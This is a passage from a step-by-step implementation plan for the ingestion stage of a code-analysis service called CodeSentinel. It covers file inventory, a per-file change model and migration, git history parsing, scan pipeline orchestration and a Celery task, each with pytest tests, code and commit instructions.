    result = clone_repository(git_repo_url, tmp_path / "clone", settings=file_settings)
    assert result.path.stat().st_mode & 0o005, "directory must be world read+execute"
    assert (result.path / "pkg" / "module.py").stat().st_mode & 0o004
```

This needs a second fixture. Add it to `conftest.py` beside the others — the large file must be **committed**, because a clone copies committed objects, not the working tree. An uncommitted file would leave the test passing for the wrong reason:

```python
@pytest.fixture
def large_git_repo(git_repo: Path, git_binary: str) -> Path:
    """The fixture repository plus a committed payload larger than a 1 MB budget.

    Incompressible bytes, because git compresses objects: a megabyte of zeroes lands as
    a few hundred bytes and the size guard would never fire.
    """
    payload = git_repo / "big.bin"
    payload.write_bytes(os.urandom(3 * 1024 * 1024))
    _git(git_binary, git_repo, "add", "-A")
    _git(git_binary, git_repo, "commit", "-m", "chore: add payload", "--quiet")
    return git_repo


@pytest.fixture
def large_git_repo_url(large_git_repo: Path) -> str:
    return large_git_repo.as_uri()
```

- [ ] **Step 6: Run the integration tests**

Run: `.venv/Scripts/python -m pytest tests/integration/test_cloner_integration.py -v -rs`
Expected: PASS, or SKIP with the git reason.

- [ ] **Step 7: Run the whole gate**

Run: `bash ../.claude/skills/codesentinel-development/scripts/gate.sh`
Expected: every step ok; report skips honestly.

- [ ] **Step 8: Commit**

```bash
git add backend/app/services/ingestion/cloner.py backend/tests/unit/test_cloner.py backend/tests/integration/test_cloner_integration.py backend/tests/conftest.py
git commit -m "feat(ingestion): clone target repositories under a hardened git"
```

Body must record the GitPython finding: that `clone_from`'s progress callback cannot abort a clone because exceptions are swallowed by daemon pump threads, that driving the process directly is what makes the size guard real, and that doing so bypasses `check_unsafe_protocols`, which is why URL validation and `protocol.allow=never` are both mandatory.

---

### Task 5: File inventory

**Files:**
- Create: `backend/app/services/ingestion/inventory.py`
- Test: `backend/tests/unit/test_inventory.py`

**Interfaces:**
- Consumes: nothing from earlier tasks except the package.
- Produces: `FileRecord(path: str, language: str | None, loc: int | None, is_test: bool)`; `inventory_files(root: Path) -> list[FileRecord]`; `classify_language(path: PurePosixPath) -> str | None`; `is_test_path(path: PurePosixPath) -> bool`; `count_lines(path: Path) -> int | None`.

- [ ] **Step 1: Write the failing test**

```python
"""File inventory: what is in the tree, and what we could not determine about it."""

from __future__ import annotations

from pathlib import Path, PurePosixPath

import pytest

from app.services.ingestion.inventory import (
    classify_language,
    count_lines,
    inventory_files,
    is_test_path,
)


@pytest.mark.parametrize(
    ("path", "expected"),
    [
        ("pkg/module.py", "python"),
        ("setup.pyi", "python"),
        ("README.md", "markdown"),
        ("data.json", "json"),
        ("Makefile", None),
        ("image.png", None),
    ],
)
def test_language_is_classified_by_extension(path: str, expected: str | None) -> None:
    assert classify_language(PurePosixPath(path)) == expected


@pytest.mark.parametrize(
    ("path", "expected"),
    [
        ("tests/test_a.py", True),
        ("pkg/tests/test_a.py", True),
        ("test_module.py", True),
        ("module_test.py", True),
        ("conftest.py", True),
        ("pkg/module.py", False),
        ("pkg/contest.py", False),
        ("latest/thing.py", False),
    ],
)
def test_test_files_are_identified(path: str, expected: bool) -> None:
    """Phase 6 intersects coverage with complexity; test code must not be scored as
    production code."""
    assert is_test_path(PurePosixPath(path)) is expected


def test_an_empty_file_has_zero_lines(tmp_path: Path) -> None:
    """Zero is a real measurement about a real empty file."""
    target = tmp_path / "empty.py"
    target.write_text("", encoding="utf-8")
    assert count_lines(target) == 0


def test_an_undecodable_file_has_no_line_count(tmp_path: Path) -> None:
    """None means 'we could not count', which is not the same fact as 0 (C3)."""
    target = tmp_path / "blob.bin"
    target.write_bytes(b"\x00\xff\xfe\x00binary\x00")
    assert count_lines(target) is None


def test_inventory_skips_the_git_directory(tmp_path: Path) -> None:
    (tmp_path / ".git").mkdir()
    (tmp_path / ".git" / "config").write_text("x", encoding="utf-8")
    (tmp_path / "pkg.py").write_text("x = 1\n", encoding="utf-8")

    paths = {record.path for record in inventory_files(tmp_path)}
    assert paths == {"pkg.py"}


def test_inventory_reports_posix_paths(tmp_path: Path) -> None:
    """Paths are stored POSIX-style so a Windows-ingested repo matches a Linux one."""
    nested = tmp_path / "a" / "b"
    nested.mkdir(parents=True)
    (nested / "c.py").write_text("x = 1\n", encoding="utf-8")

    assert [record.path for record in inventory_files(tmp_path)] == ["a/b/c.py"]
```

- [ ] **Step 2: Run it and watch it fail**

Run: `.venv/Scripts/python -m pytest tests/unit/test_inventory.py -v`
Expected: FAIL — no module `app.services.ingestion.inventory`.

- [ ] **Step 3: Implement**

Create `app/services/ingestion/inventory.py`:

```python
"""Walking a cloned repository into file records.

Reading a file's bytes is not the "analysis" constraint C1 confines to the sandbox: no
target code is executed here, and nothing a target can put in a file changes what this
module does. ADR 0011 records where that line sits and why.

The load-bearing distinction in this module is between a count of zero and no count at
all. An empty file genuinely has zero lines; a file whose bytes are not text has an
unknown number of them. Phase 4 divides by these.
"""

from __future__ import annotations

import os
from dataclasses import dataclass
from pathlib import Path, PurePosixPath

import structlog

logger = structlog.get_logger(__name__)

#: Extension to language. Deliberately small: Python is what this system analyses, and a
#: language named here implies an analyser that can read it.
LANGUAGE_BY_SUFFIX = {
    ".py": "python",
    ".pyi": "python",
    ".md": "markdown",
    ".rst": "restructuredtext",
    ".json": "json",
    ".toml": "toml",
    ".yaml": "yaml",
    ".yml": "yaml",
    ".cfg": "ini",
    ".ini": "ini",
    ".txt": "text",
}

#: Never walked into. .git is the repository's own metadata, and the rest are caches that
#: would otherwise be inventoried as though a human wrote them.
SKIP_DIRECTORIES = frozenset(
    {".git", ".hg", ".svn", "__pycache__", ".mypy_cache", ".pytest_cache", ".ruff_cache",
     ".tox", ".venv", "venv", "node_modules", ".eggs"}
)

MAX_LINE_COUNT_BYTES = 8 * 1024 * 1024


@dataclass(frozen=True, slots=True)
class FileRecord:
    """One file in the working tree.

    ``language`` and ``loc`` are both optional, and their absence means "not determined"
    rather than "none" or "zero".
    """

    path: str
    language: str | None
    loc: int | None
    is_test: bool


def classify_language(path: PurePosixPath) -> str | None:
    """Language by extension, or None when we do not claim to know."""
    return LANGUAGE_BY_SUFFIX.get(path.suffix.lower())


def is_test_path(path: PurePosixPath) -> bool:
    """Whether this file is test code.

    Phase 6 intersects coverage with complexity to find high-risk untested code. Counting
    a test file as production code would let a well-tested test suite disguise an
    untested codebase.
    """
    if any(part == "tests" or part == "test" for part in path.parts[:-1]):
        return True
    name = path.name
    if name == "conftest.py":
        return True
    stem = path.stem
    return stem.startswith("test_") or stem.endswith("_test")


def count_lines(path: Path) -> int | None:
    """Lines in a text file, or None if it is not text we can read.

    Returns None rather than 0 for undecodable bytes: 0 is a claim about the file's
    contents, and we are not in a position to make one.
    """
    try:
        if path.stat().st_size > MAX_LINE_COUNT_BYTES:
            return None
    except OSError:
        return None

    try:
        with path.open("rb") as handle:
            raw = handle.read()
    except OSError as exc:
        logger.warning("inventory.unreadable", path=str(path), error=str(exc))
        return None

    if b"\x00" in raw:
        # A NUL byte means binary. Decoding would sometimes succeed and produce a
        # meaningless count.
        return None

    try:
        text = raw.decode("utf-8")
    except UnicodeDecodeError:
        return None

    if not text:
        return 0
    return len(text.splitlines())


def inventory_files(root: Path) -> list[FileRecord]:
    """Every file in the working tree, as records.

    Symlinks are recorded but not followed: a target can point one outside the clone, and
    following it would inventory the host.
    """
    records: list[FileRecord] = []

    for directory, subdirectories, filenames in os.walk(root, followlinks=False):
        subdirectories[:] = [name for name in subdirectories if name not in SKIP_DIRECTORIES]
        for filename in sorted(filenames):
            absolute = Path(directory) / filename
            relative = PurePosixPath(absolute.relative_to(root).as_posix())
            records.append(
                FileRecord(
                    path=str(relative),
                    language=classify_language(relative),
                    loc=None if absolute.is_symlink() else count_lines(absolute),
                    is_test=is_test_path(relative),
                )
            )

    records.sort(key=lambda record: record.path)
    return records
```

- [ ] **Step 4: Run the tests**

Run: `.venv/Scripts/python -m pytest tests/unit/test_inventory.py -v`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add backend/app/services/ingestion/inventory.py backend/tests/unit/test_inventory.py
git commit -m "feat(ingestion): inventory the working tree into file records"
```

Body: explain the zero-versus-None distinction concretely — phase 4 divides by `loc`, so a fabricated 0 becomes a division by zero or an infinitely dense file, and neither is a defensible thing to show a user.

---

### Task 6: The file_changes model and migration

**Files:**
- Modify: `backend/app/models/history.py` (add `FileChange`)
- Modify: `backend/app/models/enums.py` (add `ChangeType`)
- Modify: `backend/app/models/__init__.py` (export it)
- Create: `backend/alembic/versions/<rev>_add_file_changes.py`
- Test: `backend/tests/unit/test_models.py` (extend), `backend/tests/integration/test_persistence.py` (extend)

**Interfaces:**
- Produces: `FileChange` model with `commit_id`, `file_id` (nullable), `path`, `lines_added`, `lines_deleted`, `change_type`; `ChangeType` enum with `ADDED`, `MODIFIED`, `DELETED`, `RENAMED`.

- [ ] **Step 1: Write the failing test**

Append to `backend/tests/unit/test_models.py`:

```python
def test_a_file_change_may_reference_a_path_with_no_file_row() -> None:
    """A file touched in history may not exist at HEAD -- deleted, or renamed.

    Dropping those rows would understate churn on exactly the files that churned most
    (constraint C4: record the unresolvable rather than discarding it).
    """
    change = FileChange(
        commit_id=uuid.uuid4(),
        file_id=None,
        path="pkg/removed.py",
        lines_added=10,
        lines_deleted=3,
        change_type=ChangeType.DELETED,
    )
    assert change.file_id is None
    assert change.path == "pkg/removed.py"


def test_a_binary_file_change_has_no_line_counts() -> None:
    """git reports '-' for binary diffs; that is unknown, not zero."""
    change = FileChange(
        commit_id=uuid.uuid4(),
        file_id=None,
        path="logo.png",
        lines_added=None,
        lines_deleted=None,
        change_type=ChangeType.MODIFIED,
    )
    assert change.lines_added is None
    assert change.lines_deleted is None
```

Add `FileChange` and `ChangeType` to that module's imports.

- [ ] **Step 2: Run it and watch it fail**

Run: `.venv/Scripts/python -m pytest tests/unit/test_models.py -v`
Expected: FAIL — cannot import `FileChange`.

- [ ] **Step 3: Add the enum**

In `app/models/enums.py`, after `EdgeType`:

```python
class ChangeType(StrEnum):
    """How a file was touched by a commit."""

    ADDED = "added"
    MODIFIED = "modified"
    DELETED = "deleted"
    RENAMED = "renamed"
```

- [ ] **Step 4: Add the model**

In `app/models/history.py`, after `Commit`:

```python
class FileChange(UUIDPrimaryKeyMixin, Base):
    """One file touched by one commit.

    Phase 1's data model recorded only aggregate per-commit stats, but phase 4 ranks by
    ``complexity x recency-weighted churn`` -- which is per file. This table has to be
    populated during ingestion rather than later: the clone is deleted when the scan
    ends, so this is the only moment the mapping exists without cloning again.

    ``file_id`` is nullable and ``path`` is stored beside it because a file touched in
    history may not exist at HEAD. Discarding those rows would understate churn on
    exactly the files that churned most, which is the kind of quiet omission constraint
    C4 forbids -- the same shape as ``dependencies.target_file_id``.
    """

    __tablename__ = "file_changes"
    __table_args__ = (
        Index("ix_file_changes_commit_id", "commit_id"),
        Index("ix_file_changes_file_id", "file_id"),
    )

    commit_id: Mapped[uuid.UUID] = mapped_column(
        Uuid, ForeignKey("commits.id", ondelete="CASCADE"), nullable=False
    )
    #: Null when the path has no row in ``files`` -- it was deleted or renamed before HEAD.
    file_id: Mapped[uuid.UUID | None] = mapped_column(
        Uuid, ForeignKey("files.id", ondelete="CASCADE")
    )
    #: The path as it was AT that commit, which may differ from its path at HEAD.
    path: Mapped[str] = mapped_column(String(1024), nullable=False)
    #: Null for a binary diff, which git reports as '-' rather than a number.
    lines_added: Mapped[int | None] = mapped_column(Integer)
    lines_deleted: Mapped[int | None] = mapped_column(Integer)
    change_type: Mapped[ChangeType] = mapped_column(
        enum_column(ChangeType, "change_type"), nullable=False
    )
```

Import `ChangeType` and `enum_column` in `history.py`.

- [ ] **Step 5: Generate and review the migration**

```bash
.venv/Scripts/python -m alembic revision --autogenerate -m "add file_changes"
```

Then **read the generated script**. Autogenerate produces a draft, not a finished migration. Confirm: the `file_changes` table is created with both foreign keys and the CHECK constraint for `change_type`; the `downgrade()` actually drops the table rather than passing. Fix anything it got wrong.

- [ ] **Step 6: Run the migration both ways**

Run: `.venv/Scripts/python -m alembic upgrade head` then `.venv/Scripts/python -m alembic downgrade -1` then `upgrade head` again.
Expected: all three succeed. If there is no database available, say so in the commit body rather than claiming it was verified.

- [ ] **Step 7: Run the tests**

Run: `.venv/Scripts/python -m pytest tests/unit/test_models.py -v`
Expected: PASS.

- [ ] **Step 8: Commit**

```bash
git add backend/app/models/ backend/alembic/versions/ backend/tests/unit/test_models.py
git commit -m "feat(models): add file_changes to carry per-file churn history"
```

Body: state plainly that this is a phase 1 data-model gap found during phase 3 planning, that phase 4 cannot compute per-file churn without it, and that it must be populated during ingestion because the clone does not survive the scan.

---

### Task 7: History mining

**Files:**
- Create: `backend/app/services/ingestion/history.py`
- Test: `backend/tests/unit/test_history.py`, `backend/tests/integration/test_history_integration.py`

**Interfaces:**
- Consumes: `ChangeType` from Task 6; the `git_repo` fixture from Task 3.
- Produces: `FileChangeRecord(path, lines_added, lines_deleted, change_type)`; `CommitRecord(sha, author_email, authored_at, message_summary, files_changed, lines_added, lines_deleted, changes)`; `mine_history(repo_path: Path) -> Iterator[CommitRecord]`; `parse_numstat_line(line: str) -> FileChangeRecord | None`.

- [ ] **Step 1: Write the failing test**

```python
"""Parsing git history into commit records."""

from __future__ import annotations

from app.models.enums import ChangeType
from app.services.ingestion.history import parse_numstat_line


def test_a_text_change_carries_both_counts() -> None:
    record = parse_numstat_line("12\t3\tpkg/module.py")
    assert record is not None
    assert record.path == "pkg/module.py"
    assert record.lines_added == 12
    assert record.lines_deleted == 3
    assert record.change_type is ChangeType.MODIFIED


def test_a_binary_change_has_no_counts() -> None:
    """git prints '-' for a binary diff. That is unknown, not zero."""
    record = parse_numstat_line("-\t-\tlogo.png")
    assert record is not None
    assert record.lines_added is None
    assert record.lines_deleted is None


def test_an_added_file_is_classified_as_added() -> None:
    record = parse_numstat_line("7\t0\tpkg/new.py")
    assert record is not None
    assert record.change_type is ChangeType.ADDED


def test_a_deleted_file_is_classified_as_deleted() -> None:
    record = parse_numstat_line("0\t9\tpkg/gone.py")
    assert record is not None
    assert record.change_type is ChangeType.DELETED


def test_a_rename_records_the_new_path() -> None:
    """git's rename form is 'old => new'; churn belongs to where the file is now."""
    record = parse_numstat_line("1\t1\tpkg/{old.py => new.py}")
    assert record is not None
    assert record.path == "pkg/new.py"
    assert record.change_type is ChangeType.RENAMED


def test_a_blank_line_is_not_a_change() -> None:
    assert parse_numstat_line("") is None
```

- [ ] **Step 2: Run it and watch it fail**

Run: `.venv/Scripts/python -m pytest tests/unit/test_history.py -v`
Expected: FAIL — no module `app.services.ingestion.history`.

- [ ] **Step 3: Implement**

Create `app/services/ingestion/history.py`:

```python
"""Mining a cloned repository's commit history.

This is the data that distinguishes CodeSentinel from a linter, and it exists only while
the clone does -- the scan deletes the working tree when it finishes. Anything phases 4
and 8 need has to be extracted in this one pass.

Merge commits are excluded. A merge's diffstat re-counts changes already attributed to
its parents, so including them would inflate churn on every file touched by a merged
branch, in proportion to how often the project merges rather than how often the file
changed.

Output is streamed rather than accumulated: a mature repository carries six figures of
commits, and holding them all in memory to insert them at the end trades a bounded walk
for an unbounded one.
"""

from __future__ import annotations

import re
import subprocess
from collections.abc import Iterator
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path

import structlog

from app.models.enums import ChangeType

logger = structlog.get_logger(__name__)

#: Delimits commit headers in `git log` output. Chosen because it cannot occur in a SHA,
#: an email, an ISO timestamp or a subject line.
RECORD_SEPARATOR = "\x1e"
FIELD_SEPARATOR = "\x1f"

_RENAME_BRACE = re.compile(r"^(?P<prefix>.*)\{(?P<old>[^}]*) => (?P<new>[^}]*)\}(?P<suffix>.*)$")


@dataclass(frozen=True, slots=True)
class FileChangeRecord:
    """One file touched by one commit."""

    path: str
    lines_added: int | None
    lines_deleted: int | None
    change_type: ChangeType


@dataclass(frozen=True, slots=True)
class CommitRecord:
    """One non-merge commit.

    Every count is optional. git omits a diffstat for some commits, and reports '-' for
    binary files; a 0 in either case would be a number we invented.
    """

    sha: str
    author_email: str | None
    authored_at: datetime
    message_summary: str | None
    files_changed: int | None
    lines_added: int | None
    lines_deleted: int | None
    changes: list[FileChangeRecord] = field(default_factory=list)


def _resolve_rename(path: str) -> tuple[str, bool]:
    """Turn git's rename notation into the destination path.

    git writes ``pkg/{old.py => new.py}`` or ``old.py => new.py``. Churn is attributed to
    where the file is now, because that is the row phase 4 will rank.
    """
    match = _RENAME_BRACE.match(path)
    if match:
        rebuilt = f"{match['prefix']}{match['new']}{match['suffix']}"
        return rebuilt.replace("//", "/"), True
    if " => " in path:
        return path.split(" => ", 1)[1], True
    return path, False


def parse_numstat_line(line: str) -> FileChangeRecord | None:
    """One `--numstat` line into a record, or None if the line is not one."""
    if not line.strip():
        return None

    parts = line.split("\t")
    if len(parts) < 3:
        return None

    raw_added, raw_deleted, raw_path = parts[0], parts[1], "\t".join(parts[2:])

    # '-' is git's marker for a binary diff: the change is real but uncountable.
    added = None if raw_added.strip() == "-" else int(raw_added)
    deleted = None if raw_deleted.strip() == "-" else int(raw_deleted)

    path, renamed = _resolve_rename(raw_path.strip())

    if renamed:
        change_type = ChangeType.RENAMED
    elif added is not None and deleted == 0 and added > 0:
        change_type = ChangeType.ADDED
    elif deleted is not None and added == 0 and deleted > 0:
        change_type = ChangeType.DELETED
    else:
        change_type = ChangeType.MODIFIED

    return FileChangeRecord(
        path=path, lines_added=added, lines_deleted=deleted, change_type=change_type
    )


def mine_history(repo_path: Path) -> Iterator[CommitRecord]:
    """Stream non-merge commits, newest first, with their per-file changes."""
    log_format = FIELD_SEPARATOR.join(["%H", "%aE", "%aI", "%s"])
    command = [
        "git",
        "log",
        "--no-merges",
        "--numstat",
        f"--format={RECORD_SEPARATOR}{log_format}",
        "--date=iso-strict",
    ]

    completed = subprocess.run(
        command, cwd=repo_path, capture_output=True, text=True, check=True
    )

    for block in completed.stdout.split(RECORD_SEPARATOR):
        if not block.strip():
            continue
        record = _parse_block(block)
        if record is not None:
            yield record


def _parse_block(block: str) -> CommitRecord | None:
    """One commit's header plus its numstat lines."""
    header, _, body = block.partition("\n")
    fields = header.split(FIELD_SEPARATOR)
    if len(fields) < 4:
        logger.warning("history.malformed_header", header=header[:120])
        return None

    sha, author_email, authored_raw, summary = fields[0], fields[1], fields[2], fields[3]

    try:
        authored_at = datetime.fromisoformat(authored_raw)
    except ValueError:
        logger.warning("history.unparsable_date", sha=sha, value=authored_raw)
        return None

    changes = [
        change for change in (parse_numstat_line(line) for line in body.splitlines()) if change
    ]

    countable = [c for c in changes if c.lines_added is not None and c.lines_deleted is not None]

    return CommitRecord(
        sha=sha,
        author_email=author_email or None,
        authored_at=authored_at,
        message_summary=summary or None,
        files_changed=len(changes) or None,
        # Sum only what was countable. If every change was binary there is nothing to
        # sum, and reporting 0 would claim the commit changed no lines.
        lines_added=sum(c.lines_added or 0 for c in countable) if countable else None,
        lines_deleted=sum(c.lines_deleted or 0 for c in countable) if countable else None,
        changes=changes,
    )
```

- [ ] **Step 4: Run the unit tests**

Run: `.venv/Scripts/python -m pytest tests/unit/test_history.py -v`
Expected: PASS.

- [ ] **Step 5: Write and run the integration test**

Create `backend/tests/integration/test_history_integration.py`:

```python
"""History mining against a real repository."""

from __future__ import annotations

from pathlib import Path

import pytest

from app.services.ingestion.history import mine_history

pytestmark = pytest.mark.usefixtures("git_binary")


def test_every_commit_is_mined_newest_first(git_repo: Path) -> None:
    commits = list(mine_history(git_repo))
    assert [c.message_summary for c in commits] == [
        "test: cover f",
        "feat: add g",
        "feat: add module",
    ]


def test_commits_carry_their_per_file_changes(git_repo: Path) -> None:
    commits = {c.message_summary: c for c in mine_history(git_repo)}
    changed = {change.path for change in commits["test: cover f"].changes}
    assert changed == {"tests/test_module.py"}


def test_authorship_and_timestamps_are_recorded(git_repo: Path) -> None:
    commit = next(iter(mine_history(git_repo)))
    assert commit.author_email == "fixture@example.com"
    assert commit.authored_at.tzinfo is not None, "timestamps must be timezone-aware"
    assert len(commit.sha) == 40
```

Run: `.venv/Scripts/python -m pytest tests/integration/test_history_integration.py -v -rs`
Expected: PASS, or SKIP with the git reason.

- [ ] **Step 6: Commit**

```bash
git add backend/app/services/ingestion/history.py backend/tests/unit/test_history.py backend/tests/integration/test_history_integration.py
git commit -m "feat(ingestion): mine commit history into commit and change records"
```

Body: explain why merges are excluded (a merge's diffstat re-counts its parents' changes, inflating churn in proportion to merge frequency rather than change frequency), and why binary diffs become `None` rather than 0.

---

### Task 8: The pipeline

**Files:**
- Create: `backend/app/services/ingestion/pipeline.py`
- Test: `backend/tests/unit/test_pipeline.py`, `backend/tests/integration/test_pipeline_integration.py`

**Interfaces:**
- Consumes: everything from Tasks 1-7.
- Produces: `async run_ingestion(session: AsyncSession, scan_id: uuid.UUID, *, settings: Settings) -> None`.

- [ ] **Step 1: Write the failing unit test**

```python
"""Scan lifecycle. The services are stubbed; what is under test is the bookkeeping."""

from __future__ import annotations

from app.models.enums import ScanStatus
from app.services.ingestion import RepositoryTooLargeError
from app.services.ingestion.pipeline import classify_outcome


def test_a_complete_run_succeeds() -> None:
    assert classify_outcome(history_error=None) is ScanStatus.SUCCEEDED


def test_incomplete_history_is_partial_not_failed() -> None:
    """The inventory is still usable; discarding it would throw away real work, and
    calling it SUCCEEDED would let phase 4 present truncated churn as complete."""
    assert classify_outcome(history_error="git log exited 128") is ScanStatus.PARTIAL


def test_a_refused_clone_fails_with_the_reason_named() -> None:
    error = RepositoryTooLargeError("The repository is 5000 MB, which exceeds the 1024 MB limit.")
    assert "1024 MB" in str(error)
```

- [ ] **Step 2: Run it and watch it fail**

Run: `.venv/Scripts/python -m pytest tests/unit/test_pipeline.py -v`
Expected: FAIL — no module `app.services.ingestion.pipeline`.

- [ ] **Step 3: Implement**

Create `app/services/ingestion/pipeline.py`:

```python
"""Orchestration: a scan from PENDING to a terminal status.

The services below this module perform no database I/O; this one owns the session and the
scan's lifecycle. Keeping it that way is what lets the cloner and the miner be tested
without a database.

The clone is removed in a ``finally``. A scan that fails is exactly the case where a
multi-gigabyte working tree would otherwise be left behind, and the host fills up from
the failures rather than the successes.
"""

from __future__ import annotations

import shutil
import tempfile
import uuid
from datetime import UTC, datetime
from pathlib import Path

import structlog
from sqlalchemy import select
from sqlalchemy.ext.asyncio import AsyncSession

from app.config import Settings
from app.models.code import File
from app.models.enums import ScanStatus
from app.models.history import Commit, FileChange
from app.models.repository import Repository, Scan
from app.services.ingestion.cloner import clone_repository
from app.services.ingestion.errors import IngestionError
from app.services.ingestion.history import mine_history
from app.services.ingestion.inventory import inventory_files

logger = structlog.get_logger(__name__)

COMMIT_BATCH_SIZE = 500


def classify_outcome(*, history_error: str | None) -> ScanStatus:
    """The terminal status for a run whose clone and inventory both succeeded.

    PARTIAL rather than FAILED when history is incomplete: the file inventory still
    supports phase 6's dependency graph, so discarding it would throw away usable work.
    PARTIAL rather than SUCCEEDED because phase 4 would otherwise compute churn over a
    truncated history and present the result as complete.
    """
    return ScanStatus.PARTIAL if history_error else ScanStatus.SUCCEEDED


async def run_ingestion(
    session: AsyncSession, scan_id: uuid.UUID, *, settings: Settings
) -> None:
    """Clone, inventory and mine the repository for ``scan_id``, recording the outcome."""
    scan = await session.get(Scan, scan_id)
    if scan is None:
        raise LookupError(f"No scan with id {scan_id}")

    repository = await session.get(Repository, scan.repository_id)
    if repository is None:
        raise LookupError(f"Scan {scan_id} references a repository that does not exist")

    scan.status = ScanStatus.RUNNING
    await session.commit()

    destination = Path(tempfile.mkdtemp(prefix="codesentinel-", dir=settings.clone_root))
    clone_path = destination / "repo"

    try:
        result = clone_repository(repository.url, clone_path, settings=settings)
        scan.commit_sha = result.commit_sha
        if repository.default_branch is None:
            repository.default_branch = result.default_branch

        files_by_path = await _persist_inventory(session, repository, clone_path)
        history_error = await _persist_history(session, repository, clone_path, files_by_path)

        scan.status = classify_outcome(history_error=history_error)
        if history_error:
            scan.analyzer_statuses = {
                **scan.analyzer_statuses,
                "ingestion": {"status": "partial", "error": history_error},
            }
        scan.completed_at = datetime.now(UTC)
        await session.commit()
        logger.info("scan.done", scan_id=str(scan_id), status=scan.status)

    except IngestionError as exc:
        # An ingestion error is an ordinary, recordable outcome -- a repository that is
        # too large is not a fault in this system. The reason is stored so the caller
        # never has to read a log to find out why (anti-pattern #9).
        scan.status = ScanStatus.FAILED
        scan.error = str(exc)
        scan.completed_at = datetime.now(UTC)
        await session.commit()
        logger.warning("scan.failed", scan_id=str(scan_id), error=str(exc))

    finally:
        shutil.rmtree(destination, ignore_errors=True)


async def _persist_inventory(
    session: AsyncSession, repository: Repository, clone_path: Path
) -> dict[str, uuid.UUID]:
    """Write the file inventory and return a path -> id map for the history pass."""
    records = inventory_files(clone_path)
    files = [
        File(
            repository_id=repository.id,
            path=record.path,
            language=record.language,
            loc=record.loc,
            is_test=record.is_test,
        )
        for record in records
    ]
    session.add_all(files)
    await session.commit()
    return {file.path: file.id for file in files}


async def _persist_history(
    session: AsyncSession,
    repository: Repository,
    clone_path: Path,
    files_by_path: dict[str, uuid.UUID],
) -> str | None:
    """Write commits and their file changes. Returns a reason if it could not finish."""
    batch: list[Commit] = []
    try:
        for record in mine_history(clone_path):
            commit = Commit(
                repository_id=repository.id,
                sha=record.sha,
                author_email=record.author_email,
                authored_at=record.authored_at,
                message_summary=record.message_summary,
                files_changed=record.files_changed,
                lines_added=record.lines_added,
                lines_deleted=record.lines_deleted,
            )
            session.add(commit)
            for change in record.changes:
                session.add(
                    FileChange(
                        commit_id=commit.id,
                        # None when the path does not exist at HEAD. Recorded rather
                        # than dropped so churn is not understated on deleted files.
                        file_id=files_by_path.get(change.path),
                        path=change.path,
                        lines_added=change.lines_added,
                        lines_deleted=change.lines_deleted,
                        change_type=change.change_type,
                    )
                )
            batch.append(commit)
            if len(batch) >= COMMIT_BATCH_SIZE:
                await session.commit()
                batch.clear()
        await session.commit()
    except Exception as exc:  # noqa: BLE001 - returned as the PARTIAL reason, not swallowed
        await session.rollback()
        logger.warning("history.incomplete", error=str(exc))
        return f"History mining did not complete: {exc}"
    return None
```

- [ ] **Step 4: Run the unit tests**

Run: `.venv/Scripts/python -m pytest tests/unit/test_pipeline.py -v`
Expected: PASS.

- [ ] **Step 5: Write the integration test**

Create `backend/tests/integration/test_pipeline_integration.py`:

```python
"""The whole pipeline against a real repository and a real database."""

from __future__ import annotations

from pathlib import Path

import pytest
from sqlalchemy import select
from sqlalchemy.ext.asyncio import AsyncSession

from app.config import Settings
from app.models.code import File
from app.models.enums import ScanStatus
from app.models.history import Commit, FileChange
from app.models.repository import Repository, Scan
from app.services.ingestion.pipeline import run_ingestion

pytestmark = [pytest.mark.requires_db, pytest.mark.usefixtures("git_binary")]


@pytest.fixture
def ingest_settings(tmp_path: Path) -> Settings:
    return Settings(
        clone_allowed_protocols=["file"],
        clone_root=str(tmp_path),
        max_repo_size_mb=64,
    )


async def test_a_full_run_records_files_commits_and_changes(
    db_session: AsyncSession, git_repo_url: str, ingest_settings: Settings
) -> None:
    repository = Repository(url=git_repo_url, name="fixture/repo")
    scan = Scan(repository_id=repository.id)
    db_session.add_all([repository, scan])
    await db_session.commit()

    await run_ingestion(db_session, scan.id, settings=ingest_settings)

    await db_session.refresh(scan)
    assert scan.status is ScanStatus.SUCCEEDED
    assert scan.commit_sha is not None and len(scan.commit_sha) == 40
    assert scan.completed_at is not None

    files = (await db_session.execute(select(File))).scalars().all()
    assert {f.path for f in files} >= {"pkg/module.py", "tests/test_module.py"}
    assert next(f for f in files if f.path == "tests/test_module.py").is_test is True

    commits = (await db_session.execute(select(Commit))).scalars().all()
    assert len(commits) == 3

    changes = (await db_session.execute(select(FileChange))).scalars().all()
    assert changes, "per-file churn history must be captured during ingestion"


async def test_an_unreachable_repository_is_recorded_as_failed(
    db_session: AsyncSession, tmp_path: Path, ingest_settings: Settings
) -> None:
    """The reason is stored on the scan, so the caller never has to read a log."""
    repository = Repository(url=(tmp_path / "nope").as_uri(), name="missing/repo")
    scan = Scan(repository_id=repository.id)
    db_session.add_all([repository, scan])
    await db_session.commit()

    await run_ingestion(db_session, scan.id, settings=ingest_settings)

    await db_session.refresh(scan)
    assert scan.status is ScanStatus.FAILED
    assert scan.error, "a failed scan must say why"
```

Run: `.venv/Scripts/python -m pytest tests/integration/test_pipeline_integration.py -v -rs`
Expected: PASS, or SKIP naming the missing database or git.

- [ ] **Step 6: Commit**

```bash
git add backend/app/services/ingestion/pipeline.py backend/tests/unit/test_pipeline.py backend/tests/integration/test_pipeline_integration.py
git commit -m "feat(ingestion): orchestrate the scan pipeline"
```

Body: explain why the clone is removed in a `finally` (failure is exactly when a multi-gigabyte tree would be left behind) and why incomplete history is PARTIAL rather than FAILED or SUCCEEDED.

---

### Task 9: Celery task and engine plumbing

**Files:**
- Modify: `backend/app/db.py` (accept a pool class)
- Create: `backend/app/workers/tasks.py`
- Modify: `backend/app/workers/celery_app.py` (register the task module)
- Test: `backend/tests/unit/test_tasks.py`

**Interfaces:**
- Consumes: `run_ingestion` from Task 8.
- Produces: Celery task `codesentinel.run_scan` taking a scan id string.

- [ ] **Step 1: Write the failing test**

```python
"""The worker entry point. The pipeline is stubbed; the loop management is the subject."""

from __future__ import annotations

import uuid

from app.workers import tasks


def test_the_task_runs_the_async_pipeline(monkeypatch) -> None:  # type: ignore[no-untyped-def]
    """asyncio.run owns the loop, so a task never inherits a dirty one from its
    predecessor."""
    seen: list[uuid.UUID] = []

    async def fake_run(session, scan_id, *, settings):  # type: ignore[no-untyped-def]
        seen.append(scan_id)

    monkeypatch.setattr(tasks, "run_ingestion", fake_run)
    scan_id = uuid.uuid4()
    tasks.run_scan(str(scan_id))
    assert seen == [scan_id]


def test_an_invalid_scan_id_is_rejected_before_any_work() -> None:
    import pytest

